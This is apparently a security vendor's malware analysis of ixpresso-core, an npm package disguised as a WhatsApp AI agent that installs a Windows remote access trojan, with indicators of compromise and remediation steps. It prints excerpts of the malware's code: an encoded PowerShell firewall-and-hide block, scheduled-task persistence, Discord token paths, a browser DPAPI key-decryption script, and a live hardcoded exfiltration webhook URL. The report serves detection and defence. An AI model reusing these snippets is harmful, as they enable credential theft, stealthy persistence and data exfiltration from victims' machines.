---
title: "ixpresso-core: Windows RAT Disguised as a WhatsApp Agent"
source: "https://safedep.io/malicious-ixpresso-core-npm-rat"
site_name: SafeDep - Real-time Open Source Software Supply Chain Security
canonical_url: "https://safedep.io/malicious-ixpresso-core-npm-rat"
language: en
domdown_version: 0.3.3
image: "https://safedep.io/images/malicious-ixpresso-core-npm-rat.png"
published: "Thu Apr 16 2026 00:00:00 GMT+0000 (Coordinated Universal Time)"
description: "ixpresso-core poses as an AI WhatsApp agent on npm but installs Veltrix, a Windows RAT that steals browser credentials, Discord tokens, and keystrokes via a hardcoded Discord webhook."
---
### Table of Contents

## TL;DR

`ixpresso-core` is a purpose-built Windows Remote Access Trojan, published to npm under the description “Personal AI System Agent - Control your device via WhatsApp.” There is no WhatsApp integration. Installing any version of this package deploys a persistent agent called **Veltrix** that steals browser credentials, Discord and Telegram sessions, crypto seed phrases, and a live keystream, while opening an authenticated remote control dashboard accessible over the internet via a Cloudflare tunnel.

**Impact:**

- All saved passwords, cookies, and credit card numbers from Chrome, Brave, and Edge extracted via Windows DPAPI
- Discord authentication tokens ripped from LevelDB storage across Discord, Discord Canary, Discord PTB, and Chrome
- Telegram `tdata` session folder zipped and exfiltrated (full account access without password)
- Desktop, Documents, and Downloads scanned for files matching wallet/seed/crypto/password keywords
- Full system-wide keylog stream exfiltrated in real time to a hardcoded Discord webhook
- Clipboard monitored every 15 seconds
- Automatic screenshots triggered when focus shifts to banking, login, Discord, or browser windows
- Remote desktop (live FFmpeg screen stream), shell execution, webcam/microphone access via WebSocket API
- Persistence via Windows Scheduled Task (`WindowsHealthMonitor`) triggered at every logon

**Indicators of Compromise (IoC):**

| Indicator | Value |
| --- | --- |
| Packages | `ixpresso-core` v1.0.0–v1.0.2 |
| npm maintainer | `loltestpad` |
| Maintainer email | `[[email protected]](https://safedep.io/cdn-cgi/l/email-protection)` |
| Discord C2 webhook | `hxxps://discord[.]com/api/webhooks/1486877933300617247/9vbGvM1GGELD5AgRHxOq1n5WwJZejtgy8jSZcOqM61AnPpXiSwjjggXrXArdEUgygxQ_` |
| Discord webhook bot | `Captain Hook` (guild `1480992515933868257`, channel `1480992664232136805`) |
| MQTT broker | `broker.hivemq.com:1883` |
| MQTT topic | `veltrix/signals/VELTRIX-SIGNAL-KEY-SET` |
| Attacker hostname | `LAPTOP-TQQFE0GQ` (visible in C2 embeds) |
| Stealth exe | `%APPDATA%\Microsoft\Windows\Protect\WebSecureSystem.exe` |
| Scheduled task | `WindowsHealthMonitor` (AtLogOn) |
| Firewall rule | `Windows Security Handler` (TCP 3000, inbound, node.exe) |
| FFmpeg binary | `%APPDATA%\Microsoft\Windows\Protect\Support\WebMediaWorker.exe` |
| Cloudflared binary | `%APPDATA%\Microsoft\Windows\Protect\Support\WebSecureLink.exe` |
| Tunnels | `*.trycloudflare.com`, `ap.a.pinggy.io:443`, `localhost.run:22` |

## Package Overview

The `loltestpad` account was created on 2026-04-14, the same day as the first publish. The email domain `opemails.com` is a temporary mail service. Three packages exist under this account, all published within 48 hours:

| Package | Versions | Description (real) | Cover story |
| --- | --- | --- | --- |
| `ixpresso-core` | v1.0.0–v1.0.2 | Windows RAT (Veltrix) | “Personal AI System Agent - Control your device via WhatsApp” |
| `godsplan` | v1.0.2–v1.0.8 | AI exam cheating tool (Electron overlay) | “High-performance DOM utility and diagnostic bridge” |
| `eyevox` | v2.1.4–v2.1.11 | Lightweight AI exam cheating tool | ”Professional Stealth AI Assistant with Multi-Snapshot Reasoning” |

Three `ixpresso-core` versions shipped in under 40 minutes:

| Version | Published | Change |
| --- | --- | --- |
| 1.0.0 | 21:55 UTC | Source + pre-built `Veltrix.exe` (229 MB), server on `0.0.0.0` |
| 1.0.1 | 22:17 UTC | Executable removed, full modular JS source, server on `127.0.0.1`, tunnel added |
| 1.0.2 | 22:33 UTC | FFmpeg download fallback via PowerShell, async wrapper fix |

The package shipped 64 PNG screenshots from the attacker’s own testing machine inside the `public/screenshots/` directory. Two of them were taken at 22:27 and 22:31 UTC on 2026-04-14, six minutes before v1.0.2 published. The earliest batch dates to 2026-03-30, putting development at least two weeks before release.

The vault harvest screenshot from that same session tells its own story: the attacker ran Veltrix against their own machine and exfiltrated 94 passwords, 2 credit cards, and 16 autofill entries from their own browser profiles before publishing.

The Veltrix dashboard, running on the attacker’s own machine, shows their own stolen data in the VAULT tab: 118 passwords and 125 cookies harvested from their browser profiles:

![Veltrix VAULT dashboard on the attacker's machine (LAPTOP-TQQFE0GQ) showing 118 passwords, 125 cookies, and partial Google cookie values](https://safedep.io/images/ixpresso-vault-dashboard.png)

The attacker’s browser address bar autocomplete reveals the default master password in plain text — `admin123` embedded in a trycloudflare.com URL from a prior session:

![Browser autocomplete showing the Veltrix dashboard URL with ?pw=admin123 in the query string, exposing the default master password](https://safedep.io/images/ixpresso-password-in-url.png)

The autocomplete history also shows `127.0.0.1:5500/public/index.html` — port 5500 is the VS Code Live Server default, confirming the attacker developed and tested the dashboard locally in VS Code before deploying via tunnel.

The cookie table in the VAULT screenshots contains `RFIHUB.COM` as an active session domain. No name or email is directly visible in any screenshot. VS Code Live Server in the browser history confirms local development in VS Code before tunnel deployment.

## Execution

No `postinstall` hook. The package is positioned as a developer utility the victim runs directly. The bin launcher (`bin/ixpresso.js`) spawns the main payload with `detached: true`, `stdio: 'ignore'`, and `windowsHide: true`, unrefs the child, and exits. From the terminal’s perspective, the command finishes cleanly.

On startup, `src/index.js` passes a PowerShell block via `-EncodedCommand` before loading any application modules:

```javascript
1const initScript = `2  $exe = "${process.execPath}"3  New-NetFirewallRule -DisplayName "Windows Security Handler" -Direction Inbound -Program $exe -Action Allow -Protocol TCP -LocalPort 3000 -Enabled True -ErrorAction SilentlyContinue4
5  $t = '[DllImport("kernel32.dll")] public static extern uint SetThreadExecutionState(uint esFlags);'6  Add-Type -MemberDefinition $t -Name SleepBlocker -Namespace Native -ErrorAction SilentlyContinue7  [Native.SleepBlocker]::SetThreadExecutionState(0x80000041)8
9  $t2 = '[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow(); [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'10  Add-Type -MemberDefinition $t2 -Name Win32 -Namespace Native -ErrorAction SilentlyContinue11  $hWnd = [Native.Win32]::GetConsoleWindow()12  if ($hWnd -ne [IntPtr]::Zero) { [Native.Win32]::ShowWindow($hWnd, 0) }13`.trim();14const encoded = Buffer.from(initScript, 'utf16le').toString('base64');15exec(`powershell -NoProfile -EncodedCommand ${encoded}`, { windowsHide: true });
```

src/index.js

Three actions, one call: a firewall inbound rule named “Windows Security Handler” on TCP 3000, a `SetThreadExecutionState(0x80000041)` call that prevents sleep and away mode, and `ShowWindow(hWnd, 0)` to hide the console. The base64-encoded command avoids any string matching on the PowerShell command line.

Once the server is up and the Cloudflare tunnel connects, the attacker’s Discord channel receives the access link automatically:

![Discord C2 channel showing initial Veltrix beacon and Cloudwale Tunnel Active embed with trycloudflare.com access link](https://safedep.io/images/ixpresso-c2-beacon.png)

## Persistence

`PersistenceManager.init()` runs the moment the Express server is ready:

```javascript
1const stealthExe = path.join(appData, 'Microsoft', 'Windows', 'Protect', 'WebSecureSystem.exe');2
3// Shadow the Node runtime4fs.copyFileSync(currentExe, stealthExe);5
6// Copy src/ and public/ into the stealth directory7this._copyRecursive(src, dest);8
9// Register the scheduled task10const registerTask = `11  $action = New-ScheduledTaskAction -Execute "${stealthExe}" -Argument "${entryPoint}"12  $trigger = New-ScheduledTaskTrigger -AtLogOn13  Register-ScheduledTask -TaskName "WindowsHealthMonitor" ...14`;
```

src/utils/PersistenceManager.js

The node runtime is renamed `WebSecureSystem.exe` and placed inside `%APPDATA%\Microsoft\Windows\Protect\`, a directory legitimately used by Windows DPAPI credential protection services. The scheduled task fires at every user logon. A `PersistenceService` class with a registry `Run` key mechanism (`WindowsSecuritySync`) is present in the codebase but never invoked in v1.0.2 — likely staged for a future version.

## Credential Theft

At T+35 seconds, `SessionHijacker.executeSweep()` runs three operations:

**Discord token extraction.** Four LevelDB paths are scanned:

```javascript
1const paths = {2  Discord: path.join(appData, 'discord', 'Local Storage', 'leveldb'),3  'Discord Canary': path.join(appData, 'discordcanary', 'Local Storage', 'leveldb'),4  'Discord PTB': path.join(appData, 'discordptb', 'Local Storage', 'leveldb'),5  Chrome: path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),6};
```

src/utils/SessionHijacker.js

Classic plaintext tokens and v10 DPAPI-encrypted tokens (`dQw4w9WgXcQ:` prefix) are both extracted. Encrypted tokens are decrypted using the browser’s master key, recovered via `ProtectedData.Unprotect` through PowerShell. The resulting token report is uploaded to the Discord webhook.

**Crypto loot sweep.** Desktop, Documents, and Downloads are crawled for `.txt`, `.docx`, `.csv`, `.xlsx`, `.pdf`, and `.json` files under 2 MB whose names match `/wallet|seed|phrase|password|secret|crypto|backup|metamask|phantom/i`. Matches are zipped and uploaded.

**Telegram session.** The `tdata` folder (`%APPDATA%\Telegram Desktop\tdata`) is zipped if under 24 MB and sent to Discord. That folder alone is sufficient to take over the account without the user’s password.

The vault harvest summary from the attacker’s own test machine on April 14, the day of publication, shows 94 passwords and 2 credit cards extracted:

![Discord showing vault harvest results: 94 passwords, 2 credit cards, 16 autofill entries, with vault JSON file attached](https://safedep.io/images/ixpresso-vault-harvest.png)

A second session from the same machine shows 69 credential bundles, with Google, YouTube, and google.co.in domains visible in the attacker’s own exfiltrated cookie set:

![Veltrix VAULT tab showing 69 bundles including ACCOUNTS.GOOGLE (2 keys), YOUTUBE (10 keys), GOOGLE.COM (15 keys) — the attacker's own Google session cookies](https://safedep.io/images/ixpresso-cookie-bundles.png)

At T+45 seconds, `VaultScraper.harvest()` targets Chrome, Brave, and Edge. Each browser’s DPAPI master key is decrypted:

```javascript
1const psScript = `2  Add-Type -AssemblyName System.Security3  $enc = [Convert]::FromBase64String('${encryptedKeyBase64}')4  $unbound = $enc[5..($enc.Length-1)]5  $master = [System.Security.Cryptography.ProtectedData]::Unprotect($unbound, $null, 'CurrentUser')6  [Convert]::ToBase64String($master)7`.trim();
```

src/utils/VaultScraper.js

All profiles under each browser are enumerated. Login Data, Cookies, and Web Data SQLite databases are scanned with AES-256-GCM decryption on every `v10` prefix found. Passwords, cookies, credit card numbers, and autofill entries are serialized to a JSON report and sent to Discord.

## Surveillance

`ScoutService.start()` activates at T+45 seconds. It registers a system-wide keydown hook via `uiohook-napi`, flushes the keylog buffer every 10 characters or after 1 second of idle, prefixes each flush with the active window title, and delivers to both Discord and MQTT. Clipboard is polled every 15 seconds via `Get-Clipboard`. The keylog stream, window titles, and clipboard contents all land in the same Discord channel in real time:

![Discord showing live keylogger output with window title prefixes, clipboard capture of a trycloudflare URL, and [SCOUT] tagged keystrokes](https://safedep.io/images/ixpresso-keylogger-output.png)

The window watcher checks the foreground process every 5 seconds and takes an automatic screenshot when it matches `chrome`, `msedge`, `opera`, `banking`, `login`, `password`, `discord`, or `telegram`.

## Remote Control

A Cloudflare tunnel exposes the local port 3000 server publicly. The attacker receives the URL in a Discord embed (“Cloudwale Tunnel Active”). The dashboard requires a master password (`admin123` by default, overridable by `VELTRIX_PASSWORD`).

The dashboard itself is a browser-based command center served over the tunnel, protected by a master password prompt:

![Veltrix Command Center login page served over a trycloudflare.com domain, prompting for the master password](https://safedep.io/images/ixpresso-dashboard-login.png)

The WebSocket API handles live remote desktop via FFmpeg screen streaming, mouse and keyboard injection, webcam and microphone streaming. The HTTP API covers arbitrary PowerShell execution (`POST /api/shell/exec`), full filesystem access (list, download, upload, delete any path), process list and kill, on-demand credential harvest, webcam snapshot, 10-second audio capture, and self-destruct (`POST /api/elite/purge`), which wipes the stealth directory and sends a final Discord message.

## C2 Architecture

The Discord webhook is hardcoded in `ConfigManager.js` as the `defaultWebhook`:

```javascript
1this.defaultWebhook =2  'https://discord.com/api/webhooks/1486877933300617247/9vbGvM1GGELD5AgRHxOq1n5WwJZejtgy8jSZcOqM61AnPpXiSwjjggXrXArdEUgygxQ_';
```

src/utils/ConfigManager.js

MQTT runs alongside. Each victim publishes heartbeats every 5 seconds for the first minute, then every 30 seconds, to `veltrix/signals/VELTRIX-SIGNAL-KEY-SET/<machineId>`. The attacker can send a kill command by publishing `stopassholeshit` to the device-specific command topic. Because HiveMQ’s public broker is shared infrastructure, anyone who knows the topic string can observe beacon traffic from all victims of this campaign.

Operator and Telegram credentials are configurable via CLI flags (`--webhook=`, `--tgtoken=`, `--tgchatid=`) or environment variables, allowing the package to be redeployed with different C2 endpoints.

Querying the webhook endpoint directly confirms the channel is still active as of this writing. The webhook belongs to guild `1480992515933868257`, delivers to channel `1480992664232136805` (`#system`), and the bot is named **Captain Hook**. The Discord server also contains a `#apk` channel, which suggests an Android variant of the tooling is either planned or already in development.

## Conclusion

Three packages, one account, 48 hours from creation to takedown. The attacker hardcoded the Discord webhook, used HiveMQ’s public broker for C2, and shipped 64 screenshots from their own test session inside the tarball. None of that reduces what Veltrix can do: full DPAPI credential extraction from Chrome, Brave, and Edge; Discord and Telegram session theft; system-wide keylogging; and authenticated remote control over a Cloudflare tunnel.

The attacker ran Veltrix against their own machine before publishing. The default password is `admin123`, visible in browser autocomplete history. Anyone with the MQTT topic string can observe victim beacon traffic on HiveMQ’s public broker. The webhook is still live.

npm removed all three packages. Treat any system that ran `ixpresso-core`, `godsplan`, or `eyevox` during the 48-hour window as compromised: rotate all browser-stored credentials, revoke Discord tokens, wipe Telegram sessions from the affected machine. Check Task Scheduler for `WindowsHealthMonitor` and `%APPDATA%\Microsoft\Windows\Protect\` for `WebSecureSystem.exe`.

The `#apk` channel on the attacker’s Discord server suggests an Android payload is in development or already deployed outside npm. This campaign is not done.

Run [vet](https://github.com/safedep/vet) against your lockfiles to flag packages from newly created accounts before install.

- malware
- npm
- supply-chain
- rat
- credential-theft